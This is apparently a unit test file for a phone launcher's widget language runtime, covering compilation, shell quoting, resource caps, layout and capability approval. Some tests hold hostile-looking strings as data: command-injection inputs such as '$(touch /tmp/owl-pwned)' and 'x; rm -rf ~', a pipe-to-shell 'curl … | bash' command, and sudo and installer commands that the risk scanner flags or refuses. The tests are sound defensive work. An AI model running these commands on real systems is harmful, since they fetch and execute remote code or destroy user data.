// SPDX-License-Identifier: MIT
// Unit tests for the OWL runtime's core (plugins/omamobile.home/owl/*.js),
// under node with no container: our probes against the reference runtime's
// recorded outputs (owl-probes/*.expected.json), the resource caps, sh()
// quoting, the level rules, and the phone's sizing, palette and capability
// rules.
"use strict"
process.env.TZ = "Europe/Berlin"
const fs = require("fs"), path = require("path"), assert = require("assert")
const { load } = require("./owl-load.js")
const { walk } = require("./owl-walk.js")
const V = load("values.js"), B = load("builtins.js"), C = load("compiler.js"), R = load("runtime.js")
const P = load("phone.js"), L = load("layout.js")

let failed = 0
function test(name, f) {
  try { f(); console.log("ok - " + name) } catch (e) { failed++; console.log("not ok - " + name + "\n  " + String(e && e.stack || e).split("\n").slice(0, 4).join("\n  ")) }
}
const eq = assert.deepStrictEqual

function instance(src, extra) {
  const reports = []
  const acts = []
  const host = Object.assign({
    theme: (n) => ({ accent: 0xff7aa2f7, foreground: 0xffc0caf5, background: 0xff1a1b26, red: 0xfff7768e })[n] || null,
    tile: (n) => ({ cols: 3, rows: 3, tileWidth: 200, tileHeight: 200 })[n],
    act: (n, a) => acts.push([n].concat(a)), runInto() {}, report: (m) => reports.push(m), changed() {}
  }, extra || {})
  const program = C.compile(src)
  return { program, inst: new R.Instance(program, host, {}), reports, acts }
}
function rejects(src, pattern) {
  try { C.compile(src) } catch (e) {
    assert.ok(e instanceof C.CompileError, "a CompileError")
    if (pattern) assert.match(e.message, pattern)
    return e
  }
  assert.fail("compiled, but should be refused")
}

// ---------------------------------------------------------------- probes against the reference
const probeDir = path.join(__dirname, "owl-probes")
const fixture = JSON.parse(fs.readFileSync(path.join(probeDir, "fixture.json"), "utf8"))
const probes = fs.readdirSync(probeDir).filter((f) => f.endsWith(".owl")).map((f) => f)
  .concat(fs.readdirSync(path.join(probeDir, "bad")).filter((f) => f.endsWith(".owl")).map((f) => "bad/" + f))
for (const f of probes) {
  test("probe " + f + " matches the reference runtime", () => {
    const src = fs.readFileSync(path.join(probeDir, f), "utf8")
    const exp = JSON.parse(fs.readFileSync(path.join(probeDir, f.replace(/\.owl$/, ".expected.json")), "utf8"))
    let got
    try {
      const p = C.compile(src)
      got = { ok: true, commands: p.commands }
    } catch (e) {
      const at = C.position(src, e.at)
      got = { ok: false, at: at.line + ":" + at.column }
    }
    eq(got.ok, exp.compile.ok)
    if (!got.ok) { eq(got.at, exp.compile.at); return }
    eq(got.commands, exp.compile.commands)
    eq(JSON.parse(walk(src, fixture)), exp.walk)
  })
}

// ---------------------------------------------------------------- language rules
test("errors carry line, column and a caret", () => {
  const src = 'widget "w" {\n  Text { txt: "a" }\n}\n'
  const e = rejects(src, /Text has no property 'txt'/)
  eq(C.formatError(src, e).split("\n"), ["2:10: Text has no property 'txt' (text, style, color, fontSize, bold, italic, font, align, maxLines, width, height, size, fill, weight, padding, background, border, borderColor, radius, opacity, rotation, scale, offset, clip, visible)", "    Text { txt: \"a\" }", "           ^"])
})
test("a feature above the declared level is refused, with the fix", () => {
  rejects('widget "w" {\n  every 5s { }\n  Text { text: "a" }\n}', /every needs owl 4: add meta \{ owl: 4 \}/)
  rejects('widget "w" {\n  meta { owl: 5 }\n  source a = cmd(sh("x"))\n  Text { text: a }\n}', /sh needs owl 6/)
  rejects('widget "w" {\n  meta { owl: 8 }\n  Text { text: "a" }\n}', /needs owl 8; this phone supports up to 7/)
  C.compile('widget "w" {\n  meta { owl: 4 }\n  state n = 0\n  every 5s { n = n + 1 }\n  Text { text: n }\n}')
})
test("the commands list names every command, URL and file, in order", () => {
  const p = C.compile('widget "w" {\n  meta { owl: 6 }\n  state city = "x"\n  source a = cmd("date")\n  source b = http("https://example.org/a")\n  source c = file("~/notes.txt")\n' +
    '  source d = cmd("curl wttr.in/${sh(city)}") optional\n  Button { text: "go"; onTap: { run("notify-send hi"); terminal("btop"); url("https://example.org") } }\n  Button { text: "x"; onTap: city = run("cat ~/city") }\n}')
  eq(p.commands, ["date", "http GET https://example.org/a", "read file ~/notes.txt", "if Linux is installed: cmd(…) built from widget values",
    "notify-send hi", "btop", "cat ~/city"])
})
test("constant expressions fold, and a bad constant call is a compile error", () => {
  const p = C.compile('widget "w" {\n  source a = cmd("echo ${1 + 2} ${upper("x")}")\n  Text { text: a }\n}')
  eq(p.commands, ["echo 3 X"])
  rejects('widget "w" {\n  Text { text: fmtTime(0, "\'") }\n}', /bad time pattern/)
})
test("bare words only where the property takes them", () => {
  C.compile('widget "w" {\n  Column { align: center; Text { text: "a"; style: muted; font: icon } }\n}')
  rejects('widget "w" {\n  Text { text: center }\n}', /'center' isn't a value here/)
  // A declared name wins over the word.
  const { inst } = instance('widget "w" {\n  let center = "end"\n  Text { text: "a"; align: center }\n}')
  eq(inst.render(false).children[0].p.align, "end")
})

// ---------------------------------------------------------------- values
test("numbers print as the launcher prints them", () => {
  eq([3, 0.5, 1e21, 1e-4, 10000000.5, -0, 1e15, 2 / 3].map(V.numberText), ["3", "0.5", "1.0E21", "1.0E-4", "1.00000005E7", "0", "1.0E15", "0.6666666666666666"])
  eq(V.fixedText(1.005, 2), "1.01")
  eq(V.fixedText(-0.04, 1), "-0.0")
  eq(V.fixedText(2.5, 0), "3")
  eq(V.floatText(0.1), "0.1")
  eq(V.floatText(28.9), "28.9")
})
test("numeric text acts as a number, null passes through", () => {
  const { inst } = instance('widget "w" {\n  source s = cmd("x")\n  Text { text: "${s > 80} ${s + 1} ${s * 2} ${round(null)} ${num("81%")}" }\n}')
  inst.setSource(0, "81\n")
  eq(inst.render(false).children[0].p.text, "true 811 162 … 81")
})
test("JSON keeps its key order", () => {
  eq(V.display(V.parseJson('{"10": 1, "2": 2, "a": 3}')), "{10: 1, 2: 2, a: 3}")
  assert.throws(() => V.parseJson("{bad"))
})

// ---------------------------------------------------------------- sh()
test("sh() makes one shell word of anything, hostile text included", () => {
  const { execFileSync } = require("child_process")
  const hostile = ["it's", "a b", "$(touch /tmp/owl-pwned)", "`id`", "x; rm -rf ~", "\n\n'\"\\", "", "--help", "*"]
  for (const h of hostile) {
    const word = B.shellWord(h)
    const out = execFileSync("bash", ["-c", "printf %s " + word], { encoding: "utf8" })
    eq(out, V.textOf(h) === "…" ? "" : V.textOf(h))
  }
  assert.ok(!fs.existsSync("/tmp/owl-pwned"))
})

// ---------------------------------------------------------------- caps
test("a widget that loops hits the step budget, as an error in that value only", () => {
  const { inst, reports } = instance('widget "w" {\n  let big = range(1000).map(i => range(1000).map(j => i * j))\n  Column { Text { text: len(big) } Text { text: "still here" } }\n}')
  const tree = inst.render(false)
  eq(tree.children[0].c[0].p.text, "…")
  eq(tree.children[0].c[1].p.text, "still here")
  assert.ok(reports.some((m) => /too much work/.test(m)), reports.join("|"))
})
test("a Canvas animated by a let that reads time keeps its budget frame after frame", () => {
  // Only the Canvas reads `time`, so nothing re-renders the tile and the
  // lets are worked out while drawing, every frame, on the main budget.
  const { inst, reports } = instance('widget "w" {\n  let xs = range(500).map(i => sin(time + i))\n  Canvas { rect(xs[0], 0, 1, 1) }\n}')
  const node = inst.render(false).children[0]
  for (let f = 0; f < 600; f++) {
    inst.frame(f / 30)
    eq(node.draw(100, 100).length, 1)
  }
  eq(reports, [])
})
test("501 nodes are refused, 500 are fine; a screen has its own 1000", () => {
  const many = (n) => 'widget "w" {\n  Column {\n' + Array.from({ length: n - 1 }, () => '    Text { text: "x" }\n').join("") + "  }\n}"
  C.compile(many(500))
  rejects(many(501), /more than 500 nodes/)
})
test("more than 2000 drawing calls in a frame stop that Canvas at 2000", () => {
  const { inst, reports } = instance('widget "w" {\n  Canvas { for i in range(1000) { rect(0, 0, 1, 1)\n rect(1, 1, 1, 1)\n rect(2, 2, 1, 1) } }\n}')
  const node = inst.render(false).children[0]
  eq(node.draw(100, 100).length, 2000)
  assert.ok(reports.some((m) => /more than 2000 drawing calls/.test(m)))
})
test("lists stop at 1000 items", () => {
  const { inst } = instance('widget "w" {\n  Text { text: len(range(5000)) + len(range(600) + range(600)) }\n}')
  eq(inst.render(false).children[0].p.text, "2000")
})
test("a trigger that feeds itself is cut off", () => {
  let runs = 0
  const { inst } = instance('widget "w" {\n  meta { owl: 4 }\n  state n = 0\n  on n { n = n + 1 }\n  Button { text: n; onTap: n = 1 }\n}', {
    changed() { runs++ }
  })
  inst.render(false).children[0].h.onTap(0, 0)
  assert.ok(runs < 20, "ran " + runs + " times")
})
test("the host can hold triggers back (10 a second on the phone)", () => {
  let allowed = 0
  const { inst } = instance('widget "w" {\n  meta { owl: 4 }\n  state n = 0\n  every 1s { n = n + 1 }\n  Text { text: n }\n}', {
    allowTrigger() { return allowed++ < 3 }
  })
  for (let i = 0; i < 10; i++) inst.fire(0)
  eq(inst.render(false).children[0].p.text, "3")
})
test("history and prev sample when a source updates; persisted state comes back", () => {
  const src = 'widget "w" {\n  source s = cmd("x")\n  state keep = 1 persist\n  let h = history(s, 3) persist\n  let p = prev(s)\n  Text { text: "${h} ${p}"; onTap: keep = keep + 1 }\n}'
  const { inst } = instance(src)
  for (const v of ["1", "2", "3", "4"]) inst.setSource(0, v)
  eq(inst.render(false).children[0].p.text, "[2, 3, 4] 3")
  inst.render(false).children[0].h.onTap(0, 0)
  const saved = inst.persisted()
  eq(saved, { keep: 2, h: ["2", "3", "4"] })
  const again = new R.Instance(C.compile(src), { theme: () => null, tile: () => null, act() {}, runInto() {}, report() {}, changed() {} }, saved)
  eq(again.render(false).children[0].p.text, "[2, 3, 4] …")
})
test("at fires once its time has come, also after a restart", () => {
  const { inst } = instance('widget "w" {\n  meta { owl: 4 }\n  state endsAt = 100\n  state done = 0\n  at endsAt { done = done + 1; endsAt = 0 }\n  Text { text: done }\n}')
  inst.tick(50)
  eq(inst.render(false).children[0].p.text, "0")
  inst.tick(101)
  eq(inst.render(false).children[0].p.text, "1")
  const late = instance('widget "w" {\n  meta { owl: 4 }\n  state endsAt = 100\n  state done = 0\n  at endsAt { done = 1; endsAt = 0 }\n  Text { text: done }\n}')
  late.inst.tick(500)
  eq(late.inst.render(false).children[0].p.text, "1")
})
test("actions reach the host with their values; an unloaded first value still reaches it", () => {
  const { inst, acts } = instance('widget "w" {\n  meta { owl: 7 }\n  Button { text: "x"; onTap: { url("https://example.org/${1 + 1}"); notify("a", "b"); haptic() } }\n}')
  inst.render(false).children[0].h.onTap(0, 0)
  eq(acts, [["url", "https://example.org/2"], ["notify", "a", "b"], ["haptic"]])
})
test("time is read only by what draws with it", () => {
  const { inst } = instance('widget "w" {\n  state on = false\n  Column { if on { Canvas { circle(time, 1, 1) } } Text { text: "x"; onTap: on = true } }\n}')
  let tree = inst.render(false)
  assert.ok(!tree.readsTime)
  tree.children[0].c[0].h.onTap(0, 0)
  tree = inst.render(false)
  tree.children[0].c[0].draw(10, 10)
  assert.ok(inst.readsTime)
})

// ---------------------------------------------------------------- the phone
test("dp and sizes convert from Omalauncher's grid to ours", () => {
  const dp = P.dpFor(480)
  assert.ok(Math.abs(dp - 1.1594) < 1e-3)
  const grid = { columns: 4, rows: 6 }
  const cellH = 908 / 6
  eq(P.homeSpec({ size: [6, 3], minSize: [3, 2] }, grid, cellH, dp), { size: [4, 2], min: [2, 2], max: [4, 6] })
  eq(P.homeSpec({ size: [3, 2], minSize: [1, 1] }, grid, cellH, dp), { size: [2, 1], min: [1, 1], max: [4, 6] })
  eq(P.homeSpec({ size: [6, 5], minSize: [3, 3] }, grid, cellH, dp).size, [4, 3])
  eq(P.homeSpec({ size: [6, 3], minSize: [2, 2] }, { columns: 6, rows: 8 }, cellH, dp).size, [6, 2])
  const t = P.tileVars(228, 290.67, dp, 480, 924, 0)
  eq([t.cols, t.rows, Math.round(t.tileWidth)], [3, 4, 197])
  eq([P.cornersFor(0), P.cornersFor(4), P.cornersFor(12)], [0, 0.5, 1])
})
test("the palette fills in what a theme leaves out", () => {
  const p = P.palette(P.parseColorsToml('background = "#1a1b26"\nforeground = "#c0caf5"\naccent = "#7aa2f7"\ncolor1 = "#f7768e"\ncolor3 = "#e0af68"\n'))
  eq(V.hex8(p.red), "#fff7768e")
  eq(V.hex8(p.orange), V.hex8(V.mixArgb(p.red, p.yellow, 0.5)))
  eq(p.surface, p.lighter_background)
  eq(p.color9, p.bright_red)
  const card = P.cardPalette(p, { foreground: 0xffffffff, dimForeground: 0xaaffffff, background: 0xcc000000 })
  eq([card.foreground, card.muted], [0xffffffff, 0xaaffffff])
})
test("capabilities are derived from the commands list, with risks flagged", () => {
  const caps = (src) => P.capabilities(C.compile(src))
  let c = caps('widget "w" {\n  requires { pacman: ["curl"] }\n  source a = cmd("curl -s https://api.example.org/x | jq .")\n  Text { text: a }\n}')
  eq([c.commands.length, c.network, c.hosts, c.risks.length, c.refusals.length], [1, true, ["api.example.org"], 0, 0])
  c = caps('widget "w" {\n  meta { owl: 5 }\n  source a = http("https://example.org/feed")\n  Text { text: a }\n}')
  eq([c.commands.length, c.network, c.hosts], [0, true, ["example.org"]])
  c = caps('widget "w" {\n  source a = cmd("sudo pacman -Syu")\n  Text { text: a }\n}')
  eq(c.refusals.length, 1)
  c = caps('widget "w" {\n  source a = cmd("curl -s https://x.example/i.sh | bash")\n  Text { text: a; onTap: run("rm -rf ~/.cache/x") }\n}')
  eq(c.risks.map((r) => r.id), ["pipe-to-shell", "rm-rf"])
  c = caps('widget "w" {\n  meta { owl: 6 }\n  state q = "x"\n  source a = cmd("grep ${sh(q)} ~/.ssh/config")\n  Text { text: a }\n}')
  eq(c.risks.map((r) => r.id), ["built"])
  c = caps('widget "w" {\n  meta { owl: 2 }\n  Terminal { }\n}')
  eq([c.refusals, c.terminal, c.commands], [[], true, ["a terminal running the login shell"]])
  c = caps('widget "w" {\n  meta { owl: 7 }\n  Button { text: "x"; onTap: { haptic(); torch("toggle") } }\n}')
  eq([c.devices, P.capabilityList(c)], [["haptic", "torch"], ["haptic", "torch"]])
  const prog = C.compile('widget "w" {\n  meta { owl: 7 }\n  Button { text: "x"; onTap: haptic() }\n}')
  assert.ok(!P.approvalMatches({ commands: [] }, prog))
  assert.ok(P.approvalMatches({ commands: [], devices: ["haptic"] }, prog))
  assert.ok(P.approvalMatches({ commands: ["a", "b"] }, { commands: ["a", "b"] }))
  assert.ok(!P.approvalMatches({ commands: ["a"] }, { commands: ["a", "b"] }))
})
test("the phone's source limits", () => {
  eq(P.sourceLimits({ kind: "cmd", every: 1, timeout: 120 }, false), { every: 2, timeout: 30 })
  eq(P.sourceLimits({ kind: "http", every: 10, timeout: 10 }, false), { every: 60, timeout: 10 })
  eq(P.sourceLimits({ kind: "clock", every: 1, timeout: 0 }, false).every, 1)
})

// ---------------------------------------------------------------- layout
const mono = { width: (text, size) => text.length * size * 0.6, lineHeight: (size) => size * 1.17 }
function laid(src, w, h, sources) {
  const { inst } = instance(src)
  ;(sources || []).forEach((v, i) => inst.setSource(i, v))
  const tree = inst.render(false)
  return L.layout(tree.children, w, h, mono)
}
test("a Column stacks, a weighted child takes what is left", () => {
  const box = laid('widget "w" {\n  Column { Text { text: "ab"; fontSize: 10 } Spacer { weight: 1 } Progress { value: 5 } }\n}', 200, 100)
  const kids = box.children
  eq(kids.map((k) => [k.kind, Math.round(k.y), Math.round(k.h)]), [["Text", 0, 12], ["Spacer", 16, 72], ["Progress", 92, 8]])
  eq(kids[0].w, 200)
})
test("a Row gives fixed widths first, then weights; align centres across", () => {
  const box = laid('widget "w" {\n  Row { align: center; Text { text: "ab"; width: 40 } Text { text: "x"; weight: 1 } Box { size: 20 } }\n}', 200, 50)
  eq(box.children.map((k) => [k.kind, Math.round(k.x), Math.round(k.w)]), [["Text", 0, 40], ["Text", 48, 124], ["Box", 180, 20]])
  eq(Math.round(box.children[2].y), 15)
  assert.ok(box.children[0].y > 17 && box.children[0].y < 18)
})
test("justify places children when nothing is weighted", () => {
  const box = laid('widget "w" {\n  Row { justify: spaceBetween; fill: width; Box { size: 10 } Box { size: 10 } Box { size: 10 } }\n}', 100, 20)
  eq(box.children.map((k) => Math.round(k.x)), [0, 45, 90])
})
test("text wraps, and maxLines and title stay within their lines", () => {
  const box = laid('widget "w" {\n  Column { Text { text: "aaaa bbbb cccc"; fontSize: 10 } Text { text: "aaaa bbbb cccc"; fontSize: 10; maxLines: 1 } Text { text: "a very long title"; style: title } }\n}', 60, 200)
  eq(box.children.map((k) => k.lines), [2, 1, 1])
})
test("Grid splits its width into equal columns", () => {
  const box = laid('widget "w" {\n  Grid { columns: 3; gap: 4; for i in range(5) { Text { text: i } } }\n}', 100, 100)
  eq(box.children.map((k) => [Math.round(k.x * 10) / 10, Math.round(k.w * 10) / 10]).slice(0, 4), [[0, 30.7], [34.7, 30.7], [69.3, 30.7], [0, 30.7]])
})

// ---------------------------------------------------------------- home screen
test("an OWL widget runs only when it compiles, can run here and is approved", () => {
  const K = load("catalog.js")
  const UW = require("../plugins/omamobile.home/UserWidgets.js")
  const text = 'widget "quakes" {\n  size: 6x3\n  source q = cmd("curl -s https://example.org/q")\n  Text { text: q }\n}\n'
  const grid = { columns: 4, rows: 6 }
  const info = K.describe("me.quakes", text, grid, 908 / 6, P.dpFor(480))
  eq([info.ok, info.spec.size, info.spec.capabilities], [true, [4, 2], ["commands", "network"]])
  eq(K.summary(info.caps), "runs 1 command, uses the internet (example.org)")
  const record = { id: "me.quakes", status: "ok", errors: [], hash: "h1", kind: "owl", owl: { text } }
  eq(K.cardState(false, true, record, info, null, "").state, "off")
  eq(K.cardState(true, true, record, info, null, "").state, "approve")
  eq(K.cardState(true, true, record, info, { commands: info.program.commands, network: false }, "").state, "ok")
  eq(K.cardState(true, true, record, info, { commands: ["something else"] }, "").message.indexOf("It changed what it runs"), 0)
  eq(K.cardState(true, true, record, info, { commands: info.program.commands }, "h1").state, "error")
  const bad = K.describe("me.bad", 'widget "w" {\n  Txt { }\n}', grid, 150, 1.16)
  eq([bad.ok, K.cardState(true, true, record, bad, null, "").state], [false, "error"])
  assert.match(bad.error, /^2:3: unknown node 'Txt'/)
  const sudo = K.describe("me.sudo", 'widget "w" {\n  source a = cmd("sudo id")\n  Text { text: a }\n}', grid, 150, 1.16)
  assert.match(K.cardState(true, true, record, sudo, null, "").message, /Can't run on this phone: runs a root tool/)
  // The scan's OWL records keep their text, and the catalog sizes them from the compiler.
  const scan = UW.parseScan(JSON.stringify({ dir: "/w", widgets: [{ id: "me.quakes", status: "ok", hash: "h1", kind: "owl", owl: { text } }] }))
  eq([scan.widgets[0].kind, scan.widgets[0].status, scan.widgets[0].owl.text === text], ["owl", "ok", true])
  eq(UW.catalog(scan, { "me.quakes": info.spec })["me.quakes"].size, [4, 2])
  eq(Object.keys(UW.catalog(scan, null)), [])
})

test("phone actions and android.* answers, with mocks", () => {
  eq(P.actionArgv("haptic", []), ["fbcli", "-E", "button-pressed"])
  eq(P.actionArgv("torch", [true]), ["brightnessctl", "--device=white:torch", "--quiet", "set", "100%"])
  eq(P.actionArgv("torch", ["off"]), ["brightnessctl", "--device=white:torch", "--quiet", "set", "0"])
  eq(P.actionArgv("torch", ["toggle"])[0], "sh")
  eq(P.actionArgv("volume", ["mute"]), ["wpctl", "set-mute", "@DEFAULT_AUDIO_SINK@", "1"])
  eq(P.actionArgv("volume", [250]), ["wpctl", "set-volume", "@DEFAULT_AUDIO_SINK@", "100%"])
  eq(P.actionArgv("media", ["toggle"]), ["playerctl", "play-pause"])
  eq(P.actionArgv("url", ["x"]), null)
  eq(P.volumeFrom("Volume: 0.40 [MUTED]\n"), { level: 40, muted: true, steps: 20 })
  eq(P.volumeFrom("nothing"), null)
  const m = P.mediaFrom("Playing\nSong\nBand\nAlbum\nspotify\n61000000\n180000000\nfile:///tmp/art.png")
  eq([m.playing, m.title, m.position, m.duration, m.art], [true, "Song", 61, 180, "/tmp/art.png"])
  eq(P.mediaFrom("").playing, false)
  eq(P.modesFrom("0\ndefault do-not-disturb"), { dnd: true, saver: false, ringer: "normal", torch: false })
  eq(P.modesFrom("\n").torch, null)
  const sys = P.systemFrom("MemTotal:  8000 kB\nMemAvailable: 3000 kB\n", "123.4 99", "7.3.0\n")
  eq([sys.kernel, sys.uptime, sys.memory], ["7.3.0", 123, { total: 8192000, used: 5120000, available: 3072000 }])
  eq(P.systemFrom("", "1", "7.3.0\n", " 116041613312 16160268288\n").storage, { total: 116041613312, used: 16160268288, available: 99881345024 })
  eq([sys.storage, P.storageFrom("Size Used"), P.storageFrom("0 0")], [null, null, null])
  // the board comes from the device tree, not a fixed Pixel 7 Pro
  const tegu = P.boardFrom("Google Pixel 9a\n@@\ngoogle,zumapro-tegu\ngoogle,zumapro\n")
  eq([tegu.model, tegu.maker, tegu.codename, tegu.soc, tegu.display.width], ["Pixel 9a", "Google", "tegu", "zumapro", 1080])
  const cheetah = P.boardFrom("Google Pixel 7 Pro\n@@\ngoogle,gs201-cheetah\ngoogle,gs201\n")
  eq([cheetah.model, cheetah.codename, cheetah.soc, cheetah.display.height], ["Pixel 7 Pro", "cheetah", "gs201", 3120])
  const other = P.boardFrom("OnePlus 13\n@@\noneplus,sm8750-dodge\nqcom,sm8750\n")
  eq([other.model, other.maker, other.codename, other.soc, other.display], ["OnePlus 13", null, "dodge", "sm8750", null])
  eq([P.boardFrom("").model, P.boardFrom("").codename], [null, null])
  const s9 = P.systemFrom("", "1", "7.3.0\n", "", tegu)
  eq([s9.codename, s9.cpu.soc, s9.display.dpi], ["tegu", "zumapro", 422])
  eq([P.systemFrom("", "1", "7.3.0\n").codename, P.systemFrom("", "1", "7.3.0\n").display], [null, null])
  eq([P.batteryFrom("97\nCharging\n").level, P.batteryFrom("97\nCharging\n").charging, P.batteryFrom("97\nCharging\n").status], [97, true, "charging"])
  eq([P.batteryFrom("").level, P.batteryFrom("").status], [null, null])
  eq([P.panelOff("0\n"), P.panelOff("4\n"), P.panelOff("")], [false, true, false])
})
test("the frame clock's rates and the hidden tick", () => {
  // 20 fps untouched, 30 while touched: never the panel's 120 Hz.
  eq([P.frameInterval(false), P.frameInterval(true)], [50, 33])
  eq([P.frameSlow(20), P.frameSlow(21), P.frameSlow("x")], [false, true, false])
  // A slow widget draws every other frame.
  eq([0, 1, 2, 3].map((n) => P.frameSkipped(true, n)), [false, true, false, true])
  eq([0, 1].map((n) => P.frameSkipped(false, n)), [false, false])
  // Just past the next second while shown, the next 10 s while hidden.
  eq([P.tickDelay(12300, false), P.tickDelay(12300, true), P.tickDelay(20000, true)], [705, 7705, 10005])
})
test("a terminal's output reads as lines", () => {
  const T = load("terminal.js")
  let st = T.empty()
  st = T.feed(st, "\u001b[1;32mhello\u001b[0m\r\nprogress 10%\rprogress 99%\nab\bc")
  eq(T.text(st), "hello\nprogress 99%\nac")
  st = T.feed(st, "\u001b]0;title\u0007 more\n")
  eq(st.lines.slice(-1), ["ac more"])
  for (let i = 0; i < 400; i++) st = T.feed(st, "x\n")
  eq(st.lines.length, T.MAX_LINES)
  eq(T.argv(""), ["script", "-qfec", "exec bash -l", "/dev/null"])
  eq(T.argv("btop"), ["script", "-qfec", "btop", "/dev/null"])
})
test("a widget's screen and its actions compile; screen() needs a screen", () => {
  const { inst, acts } = instance('widget "w" {\n  meta { owl: 5 }\n  state n = 1\n  onTap: screen()\n  Text { text: "tile" }\n  screen {\n    title: "more ${n}"\n    Column { Text { text: "big" } Button { text: "back"; onTap: close() } }\n  }\n}')
  const s = inst.render(true)
  eq([s.title, s.children[0].kind], ["more 1", "Column"])
  s.children[0].c[1].h.onTap(0, 0)
  eq(acts, [["close"]])
})

test("the Store tab's rows: order, sizes, what they run, owned, updates", () => {
  const K = load("catalog.js")
  const index = { widgets: [
    { id: "a/quakes", name: "quakes", author: "a", status: "ok", version: "1.1", size: [6, 3], category: "world",
      commands: ["curl -s https://q.example/x"], capabilities: ["commands", "network"], hosts: ["q.example"] },
    { id: "b/root", name: "root", status: "unsupported", note: "runs a root tool: sudo id", version: "1" },
    { id: "c/clock", name: "clock", status: "ok", version: "2.0", size: [3, 3], commands: [], capabilities: [] }] }
  const records = [
    { id: "a.quakes", kind: "owl", owl: { sha256: "s1" }, store: { id: "a/quakes", version: "1.0", sha256: "s1" } },
    { id: "c.clock", kind: "owl", owl: { sha256: "changed" }, store: { id: "c/clock", version: "1.0", sha256: "s2" } }]
  const rows = K.storeRows(index, { widgets: [{ id: "c/clock", version: "3.0" }] }, records, { columns: 4, rows: 6 }, 908 / 6, P.dpFor(480))
  eq(rows.map((r) => r.id), ["a/quakes", "b/root", "c/clock"])
  eq([rows[0].sizeText, rows[0].summary, rows[0].owned, rows[0].update], ["4\u00d72", "runs 1 command, uses the internet (q.example)", true, true])
  eq(rows[1].summary, "not yet on this phone: runs a root tool: sudo id")
  eq([rows[2].version, rows[2].modified, rows[2].update, rows[2].summary], ["3.0", true, false, "runs nothing, reaches nothing"])
  assert.ok(K.newer("1.10", "1.9") && !K.newer("1.0", "1") && K.newer("2", "1.9"))
})

test("a port's OWL original is approved without asking only within what the port had", () => {
  const K = load("catalog.js")
  const H = require("../plugins/omamobile.home/HomeModel.js")
  const grid = { columns: 4, rows: 6 }
  const info = (text) => K.describe("x", text, grid, 151, 1.16)
  const web = info('widget "w" {\n  meta { owl: 5 }\n  state city = "" persist\n  source wx = http("https://wttr.in/${city}?format=j1") json\n  Text { text: wx }\n}')
  const today = K.portApproval(H.portCapabilities("today"), web, true)
  eq([today.extra, today.approve.network, today.approve.auto], [[], true, true])
  eq(K.portApproval(H.portCapabilities("today"), web, false).approve.network, false)
  const curl = info('widget "w" {\n  source q = cmd("curl -s https://earthquake.usgs.gov/x")\n  Text { text: q }\n}')
  eq(K.portApproval(H.portCapabilities("earthquakes"), curl, true).extra, ["runs commands"])
  eq(K.portApproval(H.portCapabilities("feeds"), curl, true).approve.commands, ["curl -s https://earthquake.usgs.gov/x"])
  eq(K.portApproval(H.portCapabilities("crypto"), web, true).extra, ["talks to wttr.in"])
  eq(K.portApproval(H.portCapabilities("koiPond"), web, true).extra, ["uses the internet"])
})

test("the owner's layout: migration approvals, and never a package install without asking", () => {
  const K = load("catalog.js")
  const H = require("../plugins/omamobile.home/HomeModel.js")
  const owner = require("./owner-layout.json")
  const grid = { columns: 4, rows: 6 }
  // Stand-ins with the originals' shape: fetch's command installs fastfetch when it's missing.
  const texts = {
    "owl:simonschubert.fetch": 'widget "fetch" {\n  meta { owl: 5 }\n  source f = cmd("command -v fastfetch >/dev/null || pacman -S --needed --noconfirm fastfetch; fastfetch --pipe")\n  Text { text: f }\n}',
    "owl:simonschubert.owl": 'widget "owl" {\n  state born = 0 persist\n  Text { text: born }\n}',
    "owl:simonschubert.koi-pond": 'widget "koi" {\n  Canvas { circle(time, 1, 1) }\n}',
    "owl:simonschubert.crypto": 'widget "bitcoin" {\n  meta { owl: 5 }\n  source m = http("https://api.coingecko.com/api/v3/x") json status\n  Text { text: m }\n}',
    "owl:simonschubert.today": 'widget "today" {\n  meta { owl: 5 }\n  state city = "" persist\n  source wx = http("https://wttr.in/${city}?format=j1") json\n  Text { text: wx }\n}',
    "owl:simonschubert.earthquakes": 'widget "q" {\n  source q = cmd("curl -s https://earthquake.usgs.gov/x")\n  Text { text: q }\n}',
    "owl:simonschubert.habits": 'widget "h" {\n  source n = cmd("cat ~/.config/omarchy-proot/habits")\n  Text { text: n }\n}',
    "owl:simonschubert.forecast": 'widget "f" {\n  source w = cmd("curl -s https://wttr.in/x")\n  Text { text: w }\n}'
  }
  const infoFor = (t) => K.describe(t, texts[t], grid, 151, 1.16)
  const fetch = infoFor("owl:simonschubert.fetch")
  assert.ok(fetch.caps.risks.some((r) => r.id === "installs"), "the sheet flags the install")
  const r = K.migrationApprovals(H.portPlacements(owner), {}, infoFor, H.portCapabilities)
  const verdict = {}
  r.decisions.forEach((d) => { verdict[d.from] = d.verdict })
  eq(verdict, { crypto: "approved", today: "approved", earthquakes: "asks", habits: "asks", forecast: "asks", fetch: "asks", owl: "approved", koiPond: "approved" })
  eq(Object.keys(r.approvals).sort(), ["owl:simonschubert.crypto", "owl:simonschubert.koi-pond", "owl:simonschubert.owl", "owl:simonschubert.today"])
  eq([r.approvals["owl:simonschubert.crypto"].network, r.approvals["owl:simonschubert.owl"].network], [true, false])
  assert.ok(r.decisions.find((d) => d.from === "fetch").extra.includes("installs software (pacman, yay, paru and the like)"))
  // An automatic approval written by an earlier build is withdrawn; one the user gave is kept.
  const stale = { "owl:simonschubert.fetch": { commands: fetch.program.commands, devices: [], network: false, auto: true, from: "fetch" },
                  "owl:simonschubert.habits": { commands: [], devices: [], network: false } }
  const again = K.recheckAutoApprovals(stale, infoFor, H.portCapabilities)
  eq([again.changed, Object.keys(again.approvals)], [true, ["owl:simonschubert.habits"]])
  // Running it twice changes nothing more.
  eq(K.migrationApprovals(H.portPlacements(owner), r.approvals, infoFor, H.portCapabilities).changed, false)
  // Other installers are flagged too; sudo is refused outright.
  for (const c of ["yay -S foo", "paru -S --noconfirm bar", "pip install x", "flatpak install y"])
    assert.ok(P.capabilities(C.compile('widget "w" {\n  source a = cmd("' + c + '")\n  Text { text: a }\n}')).risks.some((x) => x.id === "installs"), c)
  eq(P.capabilities(C.compile('widget "w" {\n  source a = cmd("sudo pacman -S x")\n  Text { text: a }\n}')).refusals.length, 1)
})

if (failed) { console.log(failed + " failed"); process.exit(1) }
